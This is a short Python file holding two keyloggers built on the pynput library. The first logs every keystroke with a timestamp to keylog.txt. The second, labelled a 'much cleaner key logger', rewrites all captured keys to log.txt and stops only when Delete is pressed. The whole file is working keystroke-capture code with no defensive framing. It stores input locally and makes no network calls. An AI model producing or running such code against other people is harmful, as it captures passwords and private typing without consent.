from pynput.keyboard import Key, Listener
import logging
import time
# added time to put some sleep
# can add timer on how many times keylog runs


logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

def on_press_key(key):
    logging.info(str(key))


with Listener(on_press=on_press_key) as listener:
    listener.join()

    # ==========================================================================================================================
    # much cleaner key logger
import pynput
from pynput.keyboard import Key, Listener


keys = []


def on_press(key):
	keys.append(key)
	write_file(keys)


def write_file(keys):
	with open('log.txt', 'w') as f:
		for key in keys:
			#removing ''
			k = str(key).replace("'", "")
			f.write(k)
			#explicitly adding a space after every keystroke for readability
			f.write(' ')


def on_release(key):
	if key == Key.delete:
		return False


with Listener(on_press = on_press, on_release = on_release) as listener:
	listener.join()
